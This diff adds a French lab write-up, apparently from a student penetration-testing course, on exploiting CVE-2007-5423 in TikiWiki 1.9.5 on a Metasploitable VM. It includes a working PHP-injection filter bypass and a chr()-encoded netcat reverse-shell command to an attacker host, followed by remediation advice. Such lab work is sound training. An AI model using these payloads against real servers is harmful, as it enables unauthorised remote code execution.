@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>TikiWiki 1.9.5 — RCE tiki-graph_formula — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">TikiWiki 1.9.5 — RCE via tiki-graph_formula.php</h1>
+    <h2 class="doc-subtitle">Exécution de code à distance par injection PHP dans un paramètre de formule, avec contournement de deux filtres</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>HTTP (Apache 2.2.8 / PHP 5.2.4) — port <code class="mono">80</code>, appli <code class="mono">/tikiwiki/</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 1 — <code class="mono">192.168.56.102</code></td></tr>
+      <tr><td class="label">CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2007-5423">CVE-2007-5423</a></td></tr>
+      <tr><td class="label">Résultat</td><td><strong>Reverse shell interactif</strong> en tant que <code class="mono">www-data</code></td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <blockquote class="evidence">
+    <strong>Note réseau.</strong> Cette page utilise le réseau de Josaphat
+    (<code>vboxnet0</code>) : cible <code>192.168.56.102</code>, Kali <code>192.168.56.1</code>.
+    Côté Jules, le même service est sur <code>172.28.128.4</code> (réseau <code>vboxnet1</code>).
+    Seules les IP changent. TikiWiki et TWiki coexistent sur le port 80 : ce sont deux
+    applications distinctes, traitées chacune dans sa propre page.
+  </blockquote>
+
+  <h2 class="section">1. Identification</h2>
+  <p>Le scan sur le port 80 révèle un <strong>Apache 2.2.8 avec PHP 5.2.4</strong>. La racine du
+  site n'a pas de titre : les applications sont rangées dans des sous-répertoires, qu'on énumère
+  pour localiser TikiWiki et en obtenir la version exacte.</p>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/ms1-tikiwiki/01-recon-nmap.png" alt="Scan nmap du port 80">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc">Résultat de <code>nmap -sC -sV -p 80 192.168.56.102</code> :
+      <code>Apache httpd 2.2.8</code> avec <code>PHP/5.2.4</code>.</span>
+      <span class="fname">images/ms1-tikiwiki/01-recon-nmap.png</span>
+    </figcaption>
+  </figure>
+
+  <pre class="terminal">$ for p in tikiwiki tiki twiki; do curl -s -o /dev/null -w "/$p/ -> %{http_code}\n" "http://192.168.56.102/$p/"; done
+/tikiwiki/ -> 302
+/tiki/ -> 404
+/twiki/ -> 200
+$ curl -s -L http://192.168.56.102/tikiwiki/ | grep -ioE 'TikiWiki [0-9.]+'
+TikiWiki 1.9.5</pre>
+
+  <p><code>/tikiwiki/</code> existe (redirection vers <code>tiki-index.php</code>) et tourne en
+  version <strong>1.9.5</strong>.</p>
+
+  <figure class="capture" id="cap-version">
+    <img src="../images/ms1-tikiwiki/02-enum-version.png" alt="Énumération des répertoires et version de TikiWiki">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc">Énumération des sous-répertoires (<code>/tikiwiki/</code> répond
+      <code>302</code>) puis extraction de la version : <strong>TikiWiki 1.9.5</strong>.</span>
+      <span class="fname">images/ms1-tikiwiki/02-enum-version.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
+  <p>À partir de la version (TikiWiki 1.9.5), on vérifie l'existence d'une faille connue, du plus
+  léger (<code>searchsploit</code>) à la référence précise (<code>info</code> du module) :</p>
+
+  <pre class="terminal">$ searchsploit tikiwiki graph
+TikiWiki 1.9.8 - 'tiki-graph_formula.php' Com...  | php/webapps/4525.pl
+TikiWiki tiki-graph_formula - PHP Remote Code...  | php/webapps/16911.rb
+
+$ msfconsole -q -x "info exploit/unix/webapp/tikiwiki_graph_formula_exec; exit"
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-5423</pre>
+
+  <p>La section <code>References</code> confirme <strong>CVE-2007-5423</strong>.</p>
+
+  <blockquote class="evidence">
+    <strong>Mécanisme.</strong> <code>tiki-graph_formula.php</code> attend dans le paramètre
+    tableau <code>f[]</code> une formule mathématique à tracer. Cette formule est évaluée côté
+    serveur via <code>create_function()</code> (en substance <code>return &lt;formule&gt;;</code>).
+    En concaténant un appel de fonction PHP dans la formule, on le fait exécuter — c'est une
+    exécution de code à distance (RCE, pour <em>Remote Code Execution</em>). Deux garde-fous
+    existent (un filtre sur les noms de fonctions et un filtre sur certains caractères) ; ils sont
+    contournables, comme montré à la section 3.
+  </blockquote>
+
+  <figure class="capture" id="cap-cve">
+    <img src="../images/ms1-tikiwiki/03-recherche-cve.png" alt="searchsploit et info module donnant la CVE">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc"><code>searchsploit tikiwiki graph</code> confirme l'existence d'un
+      exploit public, et <code>info</code> sur le module Metasploit donne
+      <strong>CVE-2007-5423</strong>.</span>
+      <span class="fname">images/ms1-tikiwiki/03-recherche-cve.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation</h2>
+  <p><strong>a) Confirmer l'exécution PHP.</strong> Test non destructif : si <code>phpinfo()</code>
+  injecté dans <code>f[]</code> s'exécute, l'injection PHP est prouvée.</p>
+
+  <pre class="terminal">$ curl -s "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=cmd" | grep -ioE 'PHP Version [0-9.]+'
+PHP Version 5.2.4</pre>
+
+  <figure class="capture" id="cap-phpinfo">
+    <img src="../images/ms1-tikiwiki/04-confirm-phpinfo.png" alt="phpinfo exécuté via l'injection">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc"><code>f[]=x.tan.phpinfo()</code> renvoie <code>PHP Version 5.2.4</code> :
+      le code PHP injecté s'exécute bien côté serveur.</span>
+      <span class="fname">images/ms1-tikiwiki/04-confirm-phpinfo.png</span>
+    </figcaption>
+  </figure>
+
+  <p><strong>b) Passer à l'exécution de commandes — contourner deux filtres.</strong> Le premier
+  filtre rejette <code>system</code> placé directement après <code>x.</code>
+  (<code>Invalid function call system</code>), mais il ne contrôle que la fonction juste après
+  <code>x.</code> : en intercalant une fonction maths autorisée (<code>tan</code>),
+  <code>system</code> passe.</p>
+
+  <pre class="terminal">$ curl -s "...f[]=x.system('id')..."
+Invalid function call system
+
+$ curl -s -G "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&t=png&title=cmd" \
+       --data-urlencode "f[]=x.tan.system('id')"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+
+  <p>Le second filtre rejette toute formule contenant un <strong>espace</strong>, un
+  <strong><code>;</code></strong>, un <strong><code>=</code></strong> ou un
+  <strong><code>+</code></strong> (sortie vide). Pour une commande complexe (reverse shell), on
+  construit donc la chaîne en <code>chr()</code> (uniquement chiffres, points et parenthèses —
+  aucun caractère filtré) :</p>
+
+  <pre class="terminal"># reverse shell FIFO+nc (pas besoin de nc -e ni de /dev/tcp)
+RS='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.1 4444 >/tmp/f'
+CHR=$(python3 -c "import sys;print('.'.join('chr(%d)'%ord(c) for c in sys.argv[1]))" "$RS")
+
+# listener côté Kali, dans un autre terminal : nc -lvnp 4444
+curl -s -G "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&t=png&title=cmd" \
+     --data-urlencode "f[]=x.tan.system($CHR)"</pre>
+
+  <figure class="capture" id="cap-rce">
+    <img src="../images/ms1-tikiwiki/05-rce-bypass.png" alt="Filtre de fonction rejeté puis contourné, RCE www-data">
+    <figcaption>
+      <strong class="idx">5.</strong>
+      <span class="desc"><code>system</code> direct est rejeté
+      (<code>Invalid function call system</code>) ; placé après <code>x.tan.</code> il s'exécute et
+      renvoie <code>uid=33(www-data)</code> — exécution de commande confirmée.</span>
+      <span class="fname">images/ms1-tikiwiki/05-rce-bypass.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <p>Le reverse shell se connecte au listener <code>nc</code> et donne une session interactive.
+  Les commandes s'exécutent <strong>sur la cible</strong> :</p>
+
+  <pre class="terminal">connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 38909
+bash: no job control in this shell
+www-data@metasploitable:/var/www/tikiwiki$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@metasploitable:/var/www/tikiwiki$ uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+www-data@metasploitable:/var/www/tikiwiki$ hostname
+metasploitable</pre>
+
+  <p>Shell interactif confirmé en tant que <strong><code>www-data</code></strong> sur
+  <code>/var/www/tikiwiki</code>. Ce n'est pas <code>root</code> : l'élévation de privilèges
+  constituera une étape distincte.</p>
+
+  <figure class="capture" id="cap-preuve">
+    <img src="../images/ms1-tikiwiki/06-reverse-shell.png" alt="Reverse shell interactif www-data">
+    <figcaption>
+      <strong class="idx">6.</strong>
+      <span class="desc">Le listener <code>nc</code> reçoit le reverse shell : prompt
+      <code>www-data@metasploitable:/var/www/tikiwiki$</code> et <code>id</code> →
+      <code>uid=33(www-data)</code> — accès interactif sur la cible.</span>
+      <span class="fname">images/ms1-tikiwiki/06-reverse-shell.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Mettre à jour TikiWiki : la branche 1.9.x est obsolète (CVE-2007-5423 corrigée à partir
+      de la 1.9.9).</li>
+      <li>Ne jamais évaluer une entrée utilisateur comme du code
+      (<code>create_function</code>/<code>eval</code>). Un filtre par liste noire est contournable
+      — démontré ici par trois techniques successives (placement de fonction,
+      <code>base64_decode</code>, <code>chr()</code>) ; préférer une liste blanche stricte ou une
+      bibliothèque de parsing mathématique sans exécution de code.</li>
+      <li>Désactiver les fonctions d'exécution dangereuses de PHP
+      (<code>system</code>, <code>exec</code>, <code>passthru</code>, <code>shell_exec</code>) via
+      <code>disable_functions</code> dans <code>php.ini</code>.</li>
+      <li>Appliquer le principe de moindre privilège au compte du serveur web
+      (<code>www-data</code>) et isoler l'application pour limiter l'impact d'une RCE.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms1/josa/tikiwiki.md"><code>ms1/josa/tikiwiki.md</code></a> (dépôt du labo)</li>
+    <li>CVE-2007-5423 : <a href="https://nvd.nist.gov/vuln/detail/CVE-2007-5423">nvd.nist.gov/vuln/detail/CVE-2007-5423</a></li>
+    <li>PoC d'origine : Exploit-DB <code>php/webapps/4525.pl</code> (via <code>searchsploit</code>)</li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — TIKIWIKI 1.9.5 RCE (tiki-graph_formula.php)</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
